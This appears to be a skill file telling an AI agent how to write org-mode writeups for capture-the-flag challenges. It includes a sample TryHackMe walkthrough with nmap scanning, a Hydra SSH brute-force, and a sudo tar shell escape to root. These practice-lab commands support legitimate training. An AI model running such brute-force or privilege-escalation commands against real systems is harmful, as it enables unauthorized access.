---
name: ctf
description: Generate README.org files for CTF challenge writeups. Use when creating documentation for solved CTF challenges from platforms like TryHackMe, HackTheBox (HTB), PicoCTF, etc. Triggers on requests to document CTF solutions, create writeups, or initialize CTF project directories.
user-invocable: true
---

# CTF Writeup (Org-mode)

Generate README.org in the current CTF challenge directory.

## Template Structure

```org
#+title: <Challenge Name> <Platform>
#+date: <timestamp>

* Description
<Challenge description or objective>

* <Tool/Phase sections as needed>
#+begin_src shell
<commands and output>
#+end_src
```

## Guidelines

1. **Title**: Use challenge name + platform abbreviation (THM, HTB, PicoCTF, etc.)
2. **Date**: Org-mode timestamp format `<YYYY-MM-DD Day>`
3. **Description**: Brief challenge objective or task description
4. **Tool sections**: Add only for tools actually used. Common sections:
   - Nmap (port scanning)
   - Gobuster/Feroxbuster/Dirsearch (directory enumeration)
   - Burp/SQLMap (web exploitation)
   - Hydra/John (credential attacks)
   - Metasploit/Custom exploit
   - Privilege Escalation
   - Flags

## Example

```org
#+title: Bounty Hacker THM
#+date: <2026-01-27 Mon>

* Description
Boot-to-root machine focused on FTP enumeration and privilege escalation.

* Nmap
#+begin_src shell
nmap -sC -sV -oN nmap/initial 10.10.10.10
# 21/tcp open  ftp     vsftpd 3.0.3
# 22/tcp open  ssh     OpenSSH 7.2p2
# 80/tcp open  http    Apache httpd 2.4.18
#+end_src

* FTP Enumeration
#+begin_src shell
ftp 10.10.10.10
# anonymous login allowed
# found: task.txt, locks.txt
#+end_src

* Hydra
#+begin_src shell
hydra -l lin -P locks.txt ssh://10.10.10.10
# [22][ssh] host: 10.10.10.10   login: lin   password: RedDr4gonSywordfIsh
#+end_src

* Privilege Escalation
#+begin_src shell
sudo -l
# (root) /bin/tar

# GTFOBins tar exploit
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
#+end_src

* Flags
- user.txt: THM{CR1M3_SysT3M}
- root.txt: THM{80UN7Y_h4ck3r}
```

## Wordlists

Wordlists are stored at `/wordlists`. Always use this path in commands:

```
/wordlists/
├── dirb/          # dirb wordlists (big.txt, common.txt, small.txt, etc.)
├── rockyou.txt    # Password list
└── SecLists/      # SecLists collection (Discovery/, Usernames/, etc.)
```

Examples:
- `hydra -l admin -P /wordlists/rockyou.txt ssh://10.10.10.10`
- `gobuster dir -u http://10.10.10.10 -w /wordlists/dirb/common.txt`
- `ffuf -u http://10.10.10.10/FUZZ -w /wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt`

## Platform Abbreviations

| Platform    | Abbreviation |
|-------------|--------------|
| TryHackMe   | THM          |
| HackTheBox  | HTB          |
| PicoCTF     | PicoCTF      |
| OverTheWire | OTW          |
| VulnHub     | VH           |
